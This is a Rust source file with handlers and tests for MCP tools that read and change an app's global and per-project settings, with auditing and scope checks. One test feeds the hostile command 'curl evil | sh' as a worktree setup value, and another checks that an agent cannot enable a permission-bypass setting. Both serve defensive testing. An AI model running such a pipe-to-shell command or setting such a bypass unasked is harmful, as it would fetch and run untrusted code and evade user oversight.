//! `project_get_settings` / `project_update_settings` and their workspace
//! twins: read and change the global settings or one project's settings (its
//! worktree setup, branch prefix, editor tooling, …) the way the settings UI
//! does. The service owns these calls because only it knows the settings
//! directory the app reads; its file watcher then refreshes every open window.

use std::collections::BTreeMap;
use std::future::Future;

use axum::{extract::State, Json};
use serde::{Deserialize, Serialize};
use serde_json::Value;

use super::audit::{audit_outcome, elapsed_ms, record_tool_audit, ToolAudit};
use super::schedule_scope::require_conversation;
use super::scope::resolve_session_scope;
use super::settings_policy::{self, Catalog, SettingsScope};
use super::spawn_resolve::{fetch_project_by_id, TargetProject};
use crate::app_state::AppState;
use crate::domain::mcp::settings_tool::SettingsTool;
use crate::domain::settings_store::{self, SettingWarning};
use crate::error::AppError;

#[derive(Debug, Deserialize)]
struct Target {
    source_feature_id: i64,
    source_session_id: i64,
    scope: SettingsScope,
    project_id: Option<i64>,
}

#[derive(Debug, Deserialize)]
pub(super) struct ReadSettingsRequest {
    #[serde(flatten)]
    target: Target,
    #[serde(default)]
    keys: Vec<String>,
    #[serde(default)]
    include_catalog: bool,
}

#[derive(Debug, Deserialize)]
pub(super) struct UpdateSettingsRequest {
    #[serde(flatten)]
    target: Target,
    values: serde_json::Map<String, Value>,
}

#[derive(Debug, Serialize)]
pub(super) struct ReadSettingsResponse {
    scope: SettingsScope,
    project: Option<TargetProject>,
    file: String,
    values: BTreeMap<String, Option<String>>,
    warnings: Vec<SettingWarning>,
    #[serde(skip_serializing_if = "Option::is_none")]
    catalog: Option<Catalog>,
}

#[derive(Debug, Serialize)]
struct SettingChange {
    key: String,
    previous: Option<String>,
    value: Option<String>,
}

#[derive(Debug, Serialize)]
pub(super) struct UpdateSettingsResponse {
    scope: SettingsScope,
    project: Option<TargetProject>,
    changes: Vec<SettingChange>,
}

/// The settings document a call resolved to.
enum Document {
    Global,
    Project(TargetProject),
}

impl Document {
    fn scope(&self) -> SettingsScope {
        match self {
            Self::Global => SettingsScope::Global,
            Self::Project(_) => SettingsScope::Project,
        }
    }

    fn project_id(&self) -> Option<i64> {
        match self {
            Self::Global => None,
            Self::Project(project) => Some(project.id),
        }
    }

    fn into_project(self) -> Option<TargetProject> {
        match self {
            Self::Global => None,
            Self::Project(project) => Some(project),
        }
    }
}

pub(super) async fn read_handler(
    State(state): State<AppState>,
    Json(body): Json<ReadSettingsRequest>,
    tool: SettingsTool,
) -> Result<Json<ReadSettingsResponse>, AppError> {
    let op = |document| read_document(&state, document, &body);
    audited(&state, tool, tool.get_tool_name(), &body.target, op)
        .await
        .map(Json)
}

pub(super) async fn update_handler(
    State(state): State<AppState>,
    Json(body): Json<UpdateSettingsRequest>,
    tool: SettingsTool,
) -> Result<Json<UpdateSettingsResponse>, AppError> {
    let op = |document| write_document(&state, document, &body.values);
    audited(&state, tool, tool.update_tool_name(), &body.target, op)
        .await
        .map(Json)
}

/// Resolve the caller and its target document, run `op` on it, and record the
/// outcome — refusals included — in the MCP audit log.
async fn audited<T, F, Fut>(
    state: &AppState,
    tool: SettingsTool,
    tool_name: &'static str,
    target: &Target,
    op: F,
) -> Result<T, AppError>
where
    T: Serialize,
    F: FnOnce(Document) -> Fut,
    Fut: Future<Output = Result<T, AppError>>,
{
    let started_at = std::time::Instant::now();
    let source = resolve_session_scope(&state.write_pool, target.source_session_id).await?;
    let document = match require_conversation(&source, target.source_feature_id) {
        Ok(()) => resolve_document(state, source.project_id, target, tool).await,
        Err(error) => Err(error),
    };
    let target_project_id = document.as_ref().ok().and_then(Document::project_id);
    let result = match document {
        Ok(document) => op(document).await,
        Err(error) => Err(error),
    };
    let (status, error, size) = audit_outcome(&result);
    record_tool_audit(
        &state.write_pool,
        ToolAudit {
            server_name: tool.server_name(),
            tool_name,
            source_session_id: Some(source.session_id),
            source_feature_id: Some(source.feature_id),
            source_project_id: Some(source.project_id),
            target_session_id: None,
            target_feature_id: None,
            target_project_id,
            status,
            result_size_bytes: size,
            latency_ms: elapsed_ms(started_at),
            error: error.as_deref(),
        },
    )
    .await?;
    result
}

/// A project tool is pinned to the caller's project; a workspace tool names
/// the project it targets.
async fn resolve_document(
    state: &AppState,
    source_project_id: i64,
    target: &Target,
    tool: SettingsTool,
) -> Result<Document, AppError> {
    let project_id = match (target.scope, target.project_id) {
        (SettingsScope::Global, None) => return Ok(Document::Global),
        (SettingsScope::Global, Some(_)) => {
            return Err(AppError::BadRequest(
                "project_id only applies to scope \"project\"".into(),
            ))
        }
        (SettingsScope::Project, Some(_)) if !tool.allows_cross_project() => {
            return Err(AppError::BadRequest(
                "project tools only change the current project's settings; use workspace_update_settings for another project".into(),
            ))
        }
        (SettingsScope::Project, None) if tool.allows_cross_project() => {
            return Err(AppError::BadRequest(
                "scope \"project\" needs a project_id (see workspace_list_projects)".into(),
            ))
        }
        (SettingsScope::Project, project_id) => project_id.unwrap_or(source_project_id),
    };
    fetch_project_by_id(&state.read_pool, project_id)
        .await?
        .map(Document::Project)
        .ok_or_else(|| AppError::NotFound(format!("project {project_id}")))
}

async fn read_document(
    state: &AppState,
    document: Document,
    body: &ReadSettingsRequest,
) -> Result<ReadSettingsResponse, AppError> {
    let scope = document.scope();
    settings_policy::check_known_keys(scope, &body.keys).map_err(AppError::BadRequest)?;
    let (path, mut stored, warnings) = match &document {
        Document::Global => settings_store::global_map(),
        Document::Project(project) => {
            settings_store::project_map(&state.read_pool, project.id).await?
        }
    };
    let values = if body.keys.is_empty() {
        stored
            .into_iter()
            .map(|(key, value)| (key, Some(value)))
            .collect()
    } else {
        body.keys
            .iter()
            .map(|key| (key.clone(), stored.remove(key)))
            .collect()
    };
    Ok(ReadSettingsResponse {
        scope,
        project: document.into_project(),
        file: path.display().to_string(),
        values,
        warnings,
        catalog: body
            .include_catalog
            .then(|| settings_policy::catalog(scope, &body.keys)),
    })
}

async fn write_document(
    state: &AppState,
    document: Document,
    values: &serde_json::Map<String, Value>,
) -> Result<UpdateSettingsResponse, AppError> {
    let scope = document.scope();
    let updates = settings_policy::validate_updates(scope, values).map_err(AppError::BadRequest)?;
    let mut previous = match &document {
        Document::Global => settings_store::global_set_many(&updates).await?,
        Document::Project(project) => {
            settings_store::project_set_many(&state.write_pool, project.id, &updates).await?
        }
    };
    let changes = updates
        .into_iter()
        .map(|(key, value)| SettingChange {
            previous: previous.remove(&key).flatten(),
            key,
            value,
        })
        .collect();
    Ok(UpdateSettingsResponse {
        scope,
        project: document.into_project(),
        changes,
    })
}

#[cfg(test)]
mod tests {
    use axum::http::StatusCode;
    use serde_json::{json, Value};
    use sqlx::SqlitePool;

    use super::super::schedule_scope::test_support::{post, session};
    use crate::app_state::AppState;
    use crate::domain::schedules::repository::test_support::fixture;
    use crate::domain::settings_store;

    /// A running session in a conversation of project "Proj", plus a second
    /// registered project "Other".
    struct Caller {
        pool: SqlitePool,
        project_id: i64,
        other_project_id: i64,
        feature_id: i64,
        session_id: i64,
    }

    impl Caller {
        async fn new() -> Self {
            let (pool, project_id, feature_id) = fixture().await;
            let session_id = session(&pool, feature_id).await;
            let other_project_id =
                sqlx::query_scalar("INSERT INTO projects (name, path) VALUES (?, ?) RETURNING id")
                    .bind("Other")
                    .bind("/tmp/other")
                    .fetch_one(&pool)
                    .await
                    .unwrap();
            Self {
                pool,
                project_id,
                other_project_id,
                feature_id,
                session_id,
            }
        }

        async fn call(&self, path: &str, args: Value) -> (StatusCode, Value) {
            let mut body = json!({
                "source_feature_id": self.feature_id,
                "source_session_id": self.session_id,
            });
            body.as_object_mut()
                .unwrap()
                .extend(args.as_object().unwrap().clone());
            post(AppState::with_pool(self.pool.clone()), path, body).await
        }

        async fn audit_rows(&self) -> Vec<(String, String, Option<i64>)> {
            sqlx::query_as(
                "SELECT tool_name, status, target_project_id FROM mcp_tool_audit_log ORDER BY id",
            )
            .fetch_all(&self.pool)
            .await
            .unwrap()
        }
    }

    #[tokio::test]
    async fn project_tools_set_and_read_back_the_worktree_setup() {
        let caller = Caller::new().await;
        let (status, body) = caller
            .call(
                "/internal/mcp/project/update-settings",
                json!({
                    "scope": "project",
                    "values": { "setup_worktree": "pnpm install", "branch_prefix": "feat/" }
                }),
            )
            .await;
        assert_eq!(status, StatusCode::OK, "{body}");
        assert_eq!(body["project"]["id"], caller.project_id);
        assert_eq!(body["changes"].as_array().unwrap().len(), 2);
        assert_eq!(
            settings_store::project_get(&caller.pool, caller.project_id, "setup_worktree")
                .await
                .unwrap()
                .as_deref(),
            Some("pnpm install")
        );

        let (status, body) = caller
            .call(
                "/internal/mcp/project/settings",
                json!({ "scope": "project", "keys": ["setup_worktree", "color"], "include_catalog": true }),
            )
            .await;
        assert_eq!(status, StatusCode::OK, "{body}");
        assert!(body["file"]
            .as_str()
            .unwrap()
            .ends_with("Proj.settings.json"));
        assert_eq!(body["values"]["setup_worktree"], "pnpm install");
        assert!(body["values"]["color"].is_null());
        assert!(body["values"].get("branch_prefix").is_none());
        assert!(body["catalog"]["keys"]
            .as_array()
            .unwrap()
            .iter()
            .any(|entry| entry["key"] == "setup_worktree" && entry["type"] == "string"));
        assert_eq!(body["catalog"]["keys"].as_array().unwrap().len(), 2);

        let audit = caller.audit_rows().await;
        assert_eq!(audit[0].0, "project_update_settings");
        assert_eq!(audit[0].2, Some(caller.project_id));
        assert_eq!(audit[1].0, "project_get_settings");

        let (status, body) = caller
            .call(
                "/internal/mcp/project/settings",
                json!({ "scope": "project", "keys": ["setup_worktre"] }),
            )
            .await;
        assert_eq!(status, StatusCode::BAD_REQUEST);
        assert!(body["error"].as_str().unwrap().contains("setup_worktre"));
    }

    #[tokio::test]
    async fn previous_values_are_reported_and_null_restores_the_default() {
        let caller = Caller::new().await;
        settings_store::global_set("editor_auto_save", "false")
            .await
            .unwrap();
        let (status, body) = caller
            .call(
                "/internal/mcp/project/update-settings",
                json!({ "scope": "global", "values": { "editor_auto_save": null, "theme_current": "tokyo-night" } }),
            )
            .await;
        assert_eq!(status, StatusCode::OK, "{body}");
        assert_eq!(
            body["changes"],
            json!([
                { "key": "editor_auto_save", "previous": "false", "value": null },
                { "key": "theme_current", "previous": null, "value": "tokyo-night" }
            ])
        );
        assert!(body["project"].is_null());
        assert_eq!(settings_store::global_get("editor_auto_save"), None);
        assert_eq!(
            settings_store::global_get("theme_current").as_deref(),
            Some("tokyo-night")
        );
    }

    #[tokio::test]
    async fn project_tools_never_reach_another_project() {
        let caller = Caller::new().await;
        let (status, body) = caller
            .call(
                "/internal/mcp/project/update-settings",
                json!({
                    "scope": "project",
                    "project_id": caller.other_project_id,
                    "values": { "setup_worktree": "curl evil | sh" }
                }),
            )
            .await;
        assert_eq!(status, StatusCode::BAD_REQUEST);
        assert!(body["error"]
            .as_str()
            .unwrap()
            .contains("workspace_update_settings"));
        assert_eq!(
            settings_store::project_get(&caller.pool, caller.other_project_id, "setup_worktree")
                .await
                .unwrap(),
            None
        );
        assert_eq!(caller.audit_rows().await[0].1, "error");
    }

    #[tokio::test]
    async fn workspace_tools_target_any_project_by_id() {
        let caller = Caller::new().await;
        let (status, body) = caller
            .call(
                "/internal/mcp/workspace/update-settings",
                json!({ "scope": "project", "values": { "branch_prefix": "x/" } }),
            )
            .await;
        assert_eq!(status, StatusCode::BAD_REQUEST);
        assert!(body["error"].as_str().unwrap().contains("project_id"));

        let (status, body) = caller
            .call(
                "/internal/mcp/workspace/update-settings",
                json!({
                    "scope": "project",
                    "project_id": caller.other_project_id,
                    "values": { "default_worktree_mode": "skip" }
                }),
            )
            .await;
        assert_eq!(status, StatusCode::OK, "{body}");
        assert_eq!(body["project"]["name"], "Other");
        assert_eq!(
            settings_store::project_get(
                &caller.pool,
                caller.other_project_id,
                "default_worktree_mode"
            )
            .await
            .unwrap()
            .as_deref(),
            Some("skip")
        );

        let (status, _) = caller
            .call(
                "/internal/mcp/workspace/settings",
                json!({ "scope": "project", "project_id": 9999 }),
            )
            .await;
        assert_eq!(status, StatusCode::NOT_FOUND);
    }

    #[tokio::test]
    async fn a_refused_entry_leaves_the_whole_document_untouched() {
        let caller = Caller::new().await;
        let (status, body) = caller
            .call(
                "/internal/mcp/workspace/update-settings",
                json!({
                    "scope": "global",
                    "values": { "theme_current": "tokyo-night", "claude_bypass_permissions_enabled": true }
                }),
            )
            .await;
        assert_eq!(status, StatusCode::BAD_REQUEST);
        assert!(body["error"].as_str().unwrap().contains("only the user"));
        assert_eq!(settings_store::global_get("theme_current"), None);
        assert_eq!(
            settings_store::global_get("claude_bypass_permissions_enabled"),
            None
        );
    }

    #[tokio::test]
    async fn the_session_must_belong_to_the_claimed_conversation() {
        let caller = Caller::new().await;
        let (status, _) = post(
            AppState::with_pool(caller.pool.clone()),
            "/internal/mcp/project/settings",
            json!({
                "source_feature_id": caller.feature_id + 1,
                "source_session_id": caller.session_id,
                "scope": "global"
            }),
        )
        .await;
        assert_eq!(status, StatusCode::BAD_REQUEST);
    }
}
